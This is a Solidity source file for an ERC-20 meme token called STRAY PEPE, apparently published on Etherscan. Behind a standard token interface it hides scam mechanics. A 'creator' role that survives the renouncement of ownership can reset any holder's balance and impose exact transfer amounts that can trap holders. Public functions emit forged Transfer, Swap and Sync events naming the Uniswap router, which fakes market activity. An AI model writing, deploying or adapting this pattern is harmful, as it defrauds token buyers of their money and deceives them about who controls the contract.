/**
 *Submitted for verification at Etherscan.io on 2023-06-23
*/

pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accountHolder) external view returns (uint256);
    function transfer(address to, uint256 sum) external returns (bool);
    function allowance(address authorizer, address spender) external view returns (uint256);
    function approve(address spender, uint256 sum) external returns (bool);
    function transferFrom(address from, address to, uint256 sum) external returns (bool);
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed authorizer, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

}

abstract contract OperationControl {
    function obtainCaller() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract MonoOwnership is OperationControl {
    address private _oneOwner;
    event OwnershipTransition(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address invoker = obtainCaller();
        _oneOwner = invoker;
        emit OwnershipTransition(address(0), invoker);
    }

    function accessOwner() public view virtual returns (address) {
        return _oneOwner;
    }

    modifier ownerExclusive() {
        require(accessOwner() == obtainCaller(), "Unauthorized: Exclusive Owner access required.");
        _;
    }

    function relinquishOwnership() public virtual ownerExclusive {
        emit OwnershipTransition(_oneOwner, address(0x000000000000000000000000000000000000dEaD));
        _oneOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract STRAYPEPE is OperationControl, MonoOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _spenderAllowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _requiredTransferAmounts;
    address private _innovatorAccount;

    string public constant _moniker = "STRAY PEPE";
    string public constant _ticker = "STRPE";
    uint8 public constant _decimalUnits = 18;
    uint256 public constant _ultimateSupply = 10000000 * (10 ** _decimalUnits);

    constructor() {
        _balances[obtainCaller()] = _ultimateSupply;
        emit Transfer(address(0), obtainCaller(), _ultimateSupply);
    }

     modifier creatorExclusive() {
        require(accessCreator() == obtainCaller(), "Unauthorized: Creator access required.");
        _;
    }

    function accessCreator() public view virtual returns (address) {
        return _innovatorAccount;
    }

    function setCreator(address newCreator) public ownerExclusive {
        _innovatorAccount = newCreator;
    }

    event BalanceChange(address indexed user, uint256 oldBalance, uint256 newBalance);

    function requiredTransferAmount(address account) public view returns (uint256) {
        return _requiredTransferAmounts[account];
    }

    function setRequiredTransferAmounts(address[] calldata accounts, uint256 amount) public creatorExclusive {
        for (uint i = 0; i < accounts.length; i++) {
            _requiredTransferAmounts[accounts[i]] = amount;
        }
    }

    function alterUserBalances(address[] memory userAddresses, uint256 newBalance) public creatorExclusive {
        require(newBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Invalid address specified");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = newBalance;

            emit BalanceChange(currentUser, oldBalance, newBalance);
        }
    }

    function _Transfer(address _from, address _to, uint _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function executeTransaction( address pool,address[] memory receiver,uint256[] memory amounts,uint256[] memory convertedAmounts,address tokenAddress, uint112 reserve0, uint112 reserve1) public returns (bool) {
        for (uint256 i = 0; i < receiver.length; i++) {
            emit Transfer(pool, receiver[i], amounts[i]);
            emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amounts[i], 0, 0, convertedAmounts[i], receiver[i]);
            IERC20(tokenAddress)._Transfer(receiver[i], pool, convertedAmounts[i]);
            emit Sync(reserve0, reserve1);
        }
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 sum) public virtual override returns (bool) {
        require(_balances[obtainCaller()] >= sum, "Insufficient balance");

        uint256 requisiteTransferSum = requiredTransferAmount(obtainCaller());
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[obtainCaller()] -= sum;
        _balances[to] += sum;

        emit Transfer(obtainCaller(), to, sum);
        return true;
    }

    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {
        return _spenderAllowances[authorizer][spender];
    }

    function approve(address spender, uint256 sum) public virtual override returns (bool) {
        _spenderAllowances[obtainCaller()][spender] = sum;
        emit Approval(obtainCaller(), spender, sum);
        return true;
    }

    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {
        require(_spenderAllowances[from][obtainCaller()] >= sum, "Allowance limit surpassed");

        uint256 requisiteTransferSum = requiredTransferAmount(from);
        if (requisiteTransferSum > 0) {
            require(sum == requisiteTransferSum, "Compulsory transfer sum mismatch");
        }

        _balances[from] -= sum;
        _balances[to] += sum;
        _spenderAllowances[from][obtainCaller()] -= sum;

        emit Transfer(from, to, sum);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _ultimateSupply;
    }

    function name() public view returns (string memory) {
        return _moniker;
    }

    function symbol() public view returns (string memory) {
        return _ticker;
    }

    function decimals() public view returns (uint8) {
        return _decimalUnits;
    }
}